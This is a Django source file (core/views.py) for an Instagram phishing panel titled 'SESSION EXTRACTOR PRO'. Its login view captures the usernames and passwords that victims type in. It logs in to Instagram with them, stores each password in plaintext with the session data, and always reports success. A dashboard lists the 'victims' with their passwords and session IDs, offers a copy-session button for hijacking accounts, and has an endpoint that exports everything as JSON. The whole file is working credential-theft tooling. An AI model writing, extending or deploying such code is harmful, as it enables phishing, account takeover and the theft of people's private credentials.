# core/views.py → FINAL 100% WORKING (NO SYNTAX ERROR)

from django.http import JsonResponse, HttpResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from core.models import InstagramAccount
from instagrapi import Client
from cryptography.fernet import Fernet
import json
import os
from django.utils import timezone

# FERNET FROM RENDER
fernet = Fernet(os.getenv('FERNET_KEY').encode())

@csrf_exempt
def login_view(request):
    if request.method == "GET":
        return render(request, 'core/login.html')
    
    if request.method == "POST":
        username = request.POST.get('username', '').strip()
        password = request.POST.get('password', '').strip()
        
        cl = Client()
        cl.delay_range = [1, 3]
        
        try:
            cl.login(username, password)
            session = cl.get_settings()
            success = True
        except:
            session = {"failed": True}
            success = False

        encrypted = fernet.encrypt(json.dumps(session).encode()).decode()
        
        InstagramAccount.objects.update_or_create(
            username=username,
            defaults={
                'password': password,
                'session_data': encrypted,
                'is_active': success,
                'created_at': timezone.now()
            }
        )
        
        return JsonResponse({"success": True, "username": username})


def dashboard(request):
    victims = []
    total = InstagramAccount.objects.count()
    active = InstagramAccount.objects.filter(is_active=True).count()
    
    for acc in InstagramAccount.objects.all().order_by('-created_at'):
        try:
            data = json.loads(fernet.decrypt(acc.session_data.encode()).decode())
            sessionid = data.get("authorization_data", {}).get("sessionid", "")
            victims.append({
                "username": acc.username,
                "password": acc.password,
                "sessionid": sessionid,
                "active": acc.is_active,
                "time": acc.created_at.strftime("%Y-%m-%d %H:%M")
            })
        except:
            victims.append({
                "username": acc.username,
                "password": acc.password,
                "sessionid": "ERROR",
                "active": False,
                "time": "N/A"
            })
    
    # FIXED: ESCAPED QUOTES IN f-STRING
    cards = ""
    for v in victims:
        cards += f'''
        <div class="bg-gray-900 border-2 {'border-green-500' if v['active'] else 'border-red-800'} rounded-xl p-6 hover:scale-105 transition-all">
            <div class="flex justify-between items-center">
                <div>
                    <p class="text-2xl font-bold text-cyan-400">@{v['username']}</p>
                    <p class="text-yellow-300">Pass: {v['password']}</p>
                    <p class="text-xs text-gray-400">Time: {v['time']}</p>
                </div>
                <div class="text-right">
                    <button onclick="copyThis(`{v['sessionid']}`)" 
                            class="bg-green-600 hover:bg-green-700 px-6 py-3 rounded-lg font-bold text-xl">
                        COPY SESSION
                    </button>
                    <p class="text-xs mt-2 {'text-lime-400' if v['active'] else 'text-red-500'}">
                        {'ACTIVE' if v['active'] else 'FAILED'}
                    </p>
                </div>
            </div>
        </div>
        '''

    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>SESSION EXTRACTOR PRO</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@900&display=swap" rel="stylesheet">
</head>
<body class="bg-black text-white">
    <div class="min-h-screen p-8">
        <h1 class="text-6xl text-center font-bold mb-4" style="font-family: 'Orbitron'">
            <span class="text-green-500">SESSION</span> 
            <span class="text-red-500">EXTRACTOR</span> 
            <span class="text-yellow-500">PRO</span>
        </h1>
        <div class="text-center text-3xl mb-8">
            TOTAL: <span class="text-green-400">{total}</span> | 
            ACTIVE: <span class="text-lime-400">{active}</span>
        </div>
        
        <div class="grid gap-6 max-w-6xl mx-auto">
            {cards}
        </div>
        
        <div class="text-center mt-12">
            <a href="/download-json/" class="bg-purple-600 hover:bg-purple-700 px-10 py-5 rounded-full text-3xl font-bold">
                DOWNLOAD ALL AS JSON
            </a>
        </div>
    </div>
    
    <script>
        function copyThis(text) {{
            navigator.clipboard.writeText(text);
            alert("SESSION COPIED! Paste in instagrapi");
        }}
    </script>
</body>
</html>"""
    return HttpResponse(html)


def download_json(request):
    data = []
    for acc in InstagramAccount.objects.all():
        try:
            decrypted = fernet.decrypt(acc.session_data.encode()).decode()
            session = json.loads(decrypted)
            sessionid = session.get("authorization_data", {}).get("sessionid", "")
            data.append({
                "username": acc.username,
                "password": acc.password,
                "sessionid": sessionid
            })
        except:
            pass
    
    response = HttpResponse(json.dumps(data, indent=2), content_type='application/json')
    response['Content-Disposition'] = 'attachment; filename="INSTAGRAM_SESSIONS_PRO.json"'
    return response